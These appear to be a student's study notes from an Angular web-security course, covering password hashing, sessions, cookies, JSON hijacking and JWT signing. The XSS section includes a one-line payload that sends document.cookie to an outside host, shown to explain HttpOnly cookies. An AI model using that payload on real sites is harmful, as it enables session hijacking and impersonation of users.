## Angular Security MasterClass - Web Security Fundamentals Course

### Inital client / server impl:
#### TODOs:
* signup & store password [securely??]
* signin & return basic user details
* handle error if any
* Change menu's as per user state

#### Auth Service
* communicate with remote using http
* will contain user's data/state
* will have default state anonymous
    * Setup Observable for user
    * Will you consume user$ Observable directly in views or will you derive some other Observables? Why? Will simplify UI code. No need to repeate checking of observable and its properties. 
* Can Create User model (interface)


#### TIPS:

> While passing JSON payload, You can use shorthand. Key name will be same as var name.
```
return this.http.post<User>('/api/signup', {email, password})
```

> Convert any truthy variable into boolean. Apply double bang
```
!!user.id
```

> suffix $ for observable type variables.

> To prevent access to the "observer-side" of a Subject.
Why? Subject can work as observer also. Add subscribers and itself will subscribe to other observable - multicasting.

```
loggedInuser: Subject<User> = new BehaviorSubject(ANONYMOUS_USER);
user$: Observable<User> = this.loggedInuser.asObservable();
```

> Can have derived Observabled. (function chain)
```   
loggedInuser: Subject<User> = new BehaviorSubject(ANONYMOUS_USER);
user$: Observable<User> = this.loggedInuser.asObservable();
isLoggedIn$: Observable<boolean> = this.user$.pipe(map( user => !!user.id));
isLoggedOut$: Observable<boolean> = this.isLoggedIn$.pipe(map( loggedIn => !loggedIn));
```

> How to update value for above Observers? 
* Use shareReplay operator to ensure request is sent just once. 
* Use tap operator to read value in observer chain and call next() on subject.
```
return this.http.post<User>('/api/signup', {email, password})
.pipe(
    shareReplay(),
    tap((user) => {
    this.loggedInuser.next(user);
    })
)
```

> Define type of map {keytype : value type}
```
const USERS: {[key: number]: DbUser} = {};
```

### Cryptographic hash function
Take a string of any length as input and produce a fixed-length hash value.

#### Sample hashing with Node.js
```
var crypto = require('crypto');
var password = 'monkey';
// we will use another hash other SHA-256 during the course, this is just for demo purposes
var hash = crypto.createHash('sha256').update(password).digest('hex');
console.log(hash);
// You should see in the console 000c285457fc971f862a79b786476c78812c8897063c6fa9c045f579a3b2d63f
```

#### Observations:
* Its not encryption. Ireversible. One way hashing.
* Same input generates same hash. Repeatable.
* Small change in input, completely different hash.
* hash(Single char) ... should not be able to guess position in hash(message) ... Progressive estimation attack.
* Very low probability of password collosion. hash(m1) == hash(m2)
* Hashes based storage are prone to dictionary attack. If db is compromised, attacker can compare to pre-calculated hashes.
	* What is the solution? 
        * Hash multiple times time ... 1000 to 10000 times.
        * Unique cryptographic Salt per user... hash(password + salt)
            * Possible have salt for each user and *MUST* store salt along with user details.
        * Password Based Key Derivation Functions ... https://en.wikipedia.org/wiki/PBKDF2
        ```
          DK = PBKDF2(PRF, Password, Salt, c, dkLen)          
        ```
        * where:
            * PRF is a pseudorandom function of two parameters with output length hLen (e.g., a keyed HMAC)
                * **MUST** store salt along with user details.
                * Alorighms like **argon2** can store along with hash itself.
            * Password is the master password from which a derived key is generated
            * Salt is a sequence of bits, known as a cryptographic salt
            * c is the number of iterations desired
            * dkLen is the desired bit-length of the derived key
            * DK is the generated derived key
        * The Open Web Application Security Project **OWASP**
            * https://www.owasp.org/index.php/Main_Page
            * https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
            * Check adaptive one-way function section - Lists  recommendation for password storage - Updates regularly
            * Argon2 is winner of latest competition
        * **Argon2** - https://github.com/ranisalt/node-argon2
            * salt is autogenerated per user/hash and stored along with hash.
            * Generates sufficiently random salt
    * Enforce a password policy at server side.
        * Password validator: https://github.com/tarunbatra/password-validator
        * Return HTTP 400 Bad requst - will be handled by erroe handler in subscriber.
        ```
        this.authService.signup(val.email, val.password).subscribe(
            (user) => {
                console.log(user);
            },
            (errorResponse) => {
                console.log(errorResponse);
                this.errors = errorResponse.error.error;
            }
        )
        ```
## Need for Identifying user on server (each request):
### Using Session (Stateful way)
#### TODOs:
* Once user is created, identify request are coming from same user for authorization etc.
* Solution: Use cookie backed session implementation to track logged in user. Cookie is speaial header which browser send with every request to server.
    * Create Session(sessionid, user, expriesAt/validUntil)
    * Create SessionStore - SessionID - Session
    * Response: set session cookie (secure, http only)
    * Request: read session cooki and set User details accordingly
    * Use crypto.randomBytes for generating session id that is hard to guess 
        * **Refactoring**: Node callback based API calls will lead to nesting of callbacks.
        * Use async / await feature of typescript ... async calls will be executed asynchronously but code will not have nesting. With asyc / await code reads like synchronous style code - easy read ... less boiler plate.
        * Convert callback based call to promise bases using node's util.promisify utility
        * await can be used in asyc functiosn only.
        * await is equivalent to .then() 
        * error can be handles by try/catch or using catch with async function call.
        * callback will have (err, result) ... format
        * promise based function call are not lazy. i.e. They will be exceuted even if do not setup then/catch.
    * Issues with cookie:
        * Cookies are kind of storage mechanism. Can store user preferences etc.
        * XSS - Cross Site Scripting attack - Can be hijacked by malicious code and session can be hijacked.
            * Attacker can impersonate user. 
            * Image tag can load image from another server - attach session id to very small image ...
            * Comments ... which are not sanitized of HTML tags
            new Image().src="http://host.com/somepath=" + document.cookie; 
            * Solution - Mark cookies HttpOnly. - Will not be accesible to javascript ... Browser anyway is handling it automatically
    * **JSON hijacking** - Securing REST endpoints
        * **SOLUTION**: Return an object instead of an array from REST endpoint
        * What is it? - why ???
            * Seems array is valid javascript file ... can be loaded by script tag.
            * Array constructor can be changed at runtime and attacker can do what? Not sure ...
        * This is fixed in mdern browsers.
    * Signin - In case of authentication failure respond with Http-403 which is Forbidden req - The error handler in subscriber/observer.  
    ```
    function f() {
        const input1= '';
        const input2= '';
        //Step1: start with handling response in promise. Build the contract
        login1(input1, input2).
            then(() => {
                //handle return values and response
            }).
            catch((err) => {
                //handle error
            })
    }
    async function login1(input1, input2) {
        const v = await asyncFnCall();
        //process v
        return 'a'
    }
    
    //Step2: convert promise resolution aynch/await and try/catch based implementation
    function f_v2() {
        const input1= '';
        const input2= '';
        login1(input1, input2);
    }
    async function login1_V2(input1, input2) {
        try {
            const v = await asyncFnCall();
            //handle return values and response
        } catch(err) {
            //handle error
        }
        return 'a'
    }    
    ```
### Using JWT (Stateless way)
* what is it?
    * Securely share claims between two parties
    * Self verifiable - 
        * Do not have to contact Third party server to validate token
        * Do not have to keep in memory like sessionid/session
        * Validate Signature to validate the token authenticity
        * token = HMAC (base64UrlEncode(header) + . + base64UrlEncode(claims) + . + secrect)
            * base64encode vs base64**Url**Encode
            * JWT data is not encryptes, its just encoded.
            * Avoid sending sensitive information in JWT
        * Secret is shared by sender/reciver(S).
        * Party having the secret can create new tokens. Change in secret must be notified with everyparty.  
        * HS256 => HMAC using sha256 
        * Use asymmetric keys (RS256) to avoid sharing of secret with receivers
            * Use private key to sign JWT token owned by generator
            * Use public key to verify token.
            * Online RSA key generator: https://travistidwell.com/jsencrypt/demo/ 
        * Can be used to identify usesrs and manage expiration.
        * 
    * Online converters do not match it: Explained at : 
        * https://stackoverflow.com/questions/50121763/how-to-manually-validate-a-jwt-signature-using-online-tools
        * https://blog.angular-university.io/angular-jwt/
    * To verify on node console:
    ```
    let base64Header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
    let base64Payload = "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ";
    let secret = "hONPMX3tHWIp9jwLDtoCUwFAtH0RwSK6";
    let base64Signature = crypto.createHmac('sha256', secret).update(base64Header + "." + base64Payload).digest('base64').replace(/\+/g,'-').replace(/\=+$/m,'');
    console.log(base64Signature);


    let onlineCaluclatedHS256 =  "de921a2a4b225fd66ff0983e8566eb0f6e1584bdfa84120568da40e1f571dbd3";
    let base64hash = Buffer.from(onlineCaluclatedHS256, 'hex').toString('base64').replace(/\+/g,'-').replace(/\=+$/m,'');
    console.log(base64hash);
    ```

#### Expected Key characteristics
##### Pre-image resistance: 
Given a hash value h it should be difficult to find any message m such that h = hash(m)
##### Second pre-image resistance
Given an input m1, it should be difficult to find a different input m2 such that hash(m1) = hash(m2)
##### Collision resistance
It should be difficult to find two different messages m1 and m2 such that hash(m1) = hash(m2). Such a pair is called a cryptographic hash collision

#### Applications
* Verifying the integrity of messages and files
* Signature generation and verification
* Password verification
* File or data identifier (Git commit hash)
* ...
#### Implementations
* MD5
* sha1 ... sha3
* bcrypt ...
* ... @ https://en.wikipedia.org/wiki/Cryptographic_hash_function